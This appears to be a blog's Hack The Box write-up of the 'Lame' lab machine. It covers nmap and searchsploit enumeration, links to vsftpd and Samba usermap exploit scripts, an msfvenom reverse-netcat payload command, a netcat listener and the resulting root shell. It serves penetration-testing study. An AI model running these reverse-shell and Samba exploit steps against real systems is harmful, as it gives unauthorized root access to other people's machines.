@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/musubi/assets/css/style.css?v=">
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.9"></script>
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>HTB{Lame} | Musubi</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="HTB{Lame}" />
+<meta name="author" content="yunaranyancat" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Box introduction" />
+<meta property="og:description" content="Box introduction" />
+<link rel="canonical" href="http://localhost:4000/musubi/notes/htb4oscp/linux/lame" />
+<meta property="og:url" content="http://localhost:4000/musubi/notes/htb4oscp/linux/lame" />
+<meta property="og:site_name" content="Musubi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-01-29T00:00:00+08:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame","headline":"HTB{Lame}","dateModified":"2019-01-29T00:00:00+08:00","datePublished":"2019-01-29T00:00:00+08:00","author":{"@type":"Person","name":"yunaranyancat"},"description":"Box introduction","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <!-- <div class="container">
+        <h1>Musubi</h1>
+        <h2>Hey visitor, welcome to my site! (๑>ᴗ<๑)</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div> -->
+
+      <div class="container">
+        <h1>Musubi</h1>
+        <!-- <h2>Hey visitor, welcome to my site! (๑>ᴗ<๑)</h2> -->
+        
+      </div>
+      
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>29 January 2019</small>
+<h1>HTB{Lame}</h1>
+
+
+<p class="view">by yunaranyancat</p>
+
+
+<h2 id="box-introduction">Box introduction</h2>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/lame.png" alt="lame" /></p>
+
+<h2 id="requirements">Requirements</h2>
+<blockquote>
+  <p>Basic Linux command</p>
+</blockquote>
+
+<blockquote>
+  <p>Basic Python</p>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>First, by running nmap scan, we will find the version of the services on the common ports that are open.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/nmap.png" alt="nmap" /></p>
+
+<p>So, there are 4 open ports which are;</p>
+
+<p><code class="highlighter-rouge">Ports:Service</code></p>
+
+<p><code class="highlighter-rouge"> 21:ftp </code></p>
+
+<p><code class="highlighter-rouge"> 22:ssh </code></p>
+
+<p><code class="highlighter-rouge"> 139:smb</code></p>
+
+<p><code class="highlighter-rouge"> 445:smb</code></p>
+
+<p>Based on the scan, we found other information too. So, first, we will start with <code class="highlighter-rouge">ftp</code> service.</p>
+
+<h3 id="enumerating-ftp">Enumerating FTP</h3>
+<p>Based on the scan, we have few information that might be useful;</p>
+
+<p>I. Version : <code class="highlighter-rouge">vsftpd 2.3.4</code> (is it the latest version, any vulnerability related to the version?)</p>
+
+<p>II. Anonymous login allowed (what’s inside the anonymous session? any important file? )</p>
+
+<h3 id="i-version">I. Version</h3>
+
+<p>so first, we will look at the version. We will check if there is any exploit related to the particular version in the exploitdb, so start by typing
+<code class="highlighter-rouge">searchsploit vsftpd 2.3.4</code></p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/searchsploit.png" alt="searchsploit" /></p>
+
+<p>and we found out that there is <code class="highlighter-rouge">Backdoor Command Execution</code> exploit available. Let’s take a look at the exploit, below is only the part of the full exploit;</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/exploit.png" alt="snippet" /></p>
+
+<p>as we can see, the exploit is part of <code class="highlighter-rouge">Metasploit Framework</code>. So, we can start <code class="highlighter-rouge">msf</code> and run the exploit or we can exploit it without using <code class="highlighter-rouge">metasploit</code> . For now, let’s do it without <code class="highlighter-rouge">metasploit</code></p>
+
+<p>So, I found a python version at this github <a href="https://raw.githubusercontent.com/In2econd/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py">repo</a>, but when we try to run it, we will find that the attack failed.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/failpython.png" alt="failpython" /></p>
+
+<p>So, let’s move on for now…</p>
+
+<h3 id="ii-anonymous-login">II. Anonymous login</h3>
+
+<p>There is no information that can be obtained from anonymous session. So, we will move on too.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/anonymousftp.png" alt="anonymousftp" /></p>
+
+<h3 id="enumerating-ssh">Enumerating SSH</h3>
+
+<p>Since there is no credentials found and the version <code class="highlighter-rouge">OpenSSH 4.7p1</code> has no known vulnerability, we will move on to the next service.</p>
+
+<h3 id="enumerating-smb">Enumerating SMB</h3>
+
+<p>Since there are two ports open, we will first look at the version that has been scanned by our <code class="highlighter-rouge">nmap</code>.</p>
+
+<p><code class="highlighter-rouge">Port:Service:Version</code></p>
+
+<p><code class="highlighter-rouge"> 139:SMB:Samba smbd 3.X - 4.X </code></p>
+
+<p><code class="highlighter-rouge"> 445:SMB:Samba smbd 3.0.20-Debian</code></p>
+
+<h3 id="version-vulnerabilities">Version vulnerabilities</h3>
+<p>Since port 139 does not show the exact version of samba, so we will ignore it for now and go to port 445, which is <code class="highlighter-rouge">smbd 3.0.20</code>. Using <code class="highlighter-rouge">searchsploit</code>, we will come across two vulnerabilities.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/searchsploitsamba.png" alt="vuln" /></p>
+
+<p>So, by reading the first exploit, we know it is part of the <code class="highlighter-rouge">metasploit</code> modules too. Luckily, I found a python version in this <a href="https://gist.githubusercontent.com/joenorton8014/5aeffe8220e790f3356fbbd6b508efbc/raw/06712ff5afca5ee7f5dcfdd7dafc67d4688452d5/samba-usermap-bind.py">repo</a>.</p>
+
+<p>So, let’s take a look at the exploit code;</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/sourcecodeusermap.png" alt="sourcecodeusermap" /></p>
+
+<p>As we can see, the code is really simple to understand and to edit.
+The first thing we want to do is, we need to change the current shellcode into our shellcode instead;</p>
+
+<p>To generate our shellcode using <code class="highlighter-rouge">msfvenom</code>, simply type :</p>
+
+<p><code class="highlighter-rouge"> msfvenom -p cmd/unix/reverse_netcat LHOST=[Kali IP] LPORT=[Kali Port] -f python</code></p>
+
+<p>which tells <code class="highlighter-rouge">msfvenom</code> to create our shellcode and output it in python format.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/payload.png" alt="payload" /></p>
+
+<p>Then replace the available shellcode in the exploit with our new generated one. (under <code class="highlighter-rouge">shellcode</code>)</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Then , set up our listener based on the IP that we have set for our shellcode. Type,</p>
+
+<p><code class="highlighter-rouge">nc -lvnp [Kali Port]</code></p>
+
+<p>then , execute our exploit.</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/executed.png" alt="executed" /></p>
+
+<p>and boom!! we got a connection to our <code class="highlighter-rouge">netcat</code> listener. :3</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/connection.png" alt="connection" /></p>
+
+<h2 id="post-exploitation">Post exploitation</h2>
+
+<p>This exploit will give us directly a <code class="highlighter-rouge">root</code> access. We can confirm it by running <code class="highlighter-rouge">whoami</code> .</p>
+
+<p><img src="/musubi/assets/htboscp/linux/lame/root.png" alt="whoami" /></p>
+
+<h2 id="knowledge-gained">Knowledge gained</h2>
+<blockquote>
+  <p>Exploiting samba using service version attack</p>
+</blockquote>
+
+<p>And, thank you for today. Hope you learned a lot from this writeup. Until next time. :D</p>
+
+
+<!-- 
+  <small>tags: <em></em></small>
+ -->
+
+<p><a href="/musubi/index"> return to homepage</a> </p>
+
+      </section>
+    </div>
+
+    <!--  -->
+  </body>
+
+</html>
+<script>
+var typed = new Typed('#typed', {
+  stringsElement: '#typed-strings',
+  /**
+  * @property {number} typeSpeed type speed in milliseconds
+  */
+  typeSpeed: 80,
+  /**
+   * @property {number} backSpeed backspacing speed in milliseconds
+   */
+  backSpeed: 10,
+  /**
+   * @property {boolean} loop loop strings
+   * @property {number} loopCount amount of loops
+   */
+  loop: true,
+  loopCount: Infinity,
+
+
+});
+</script>
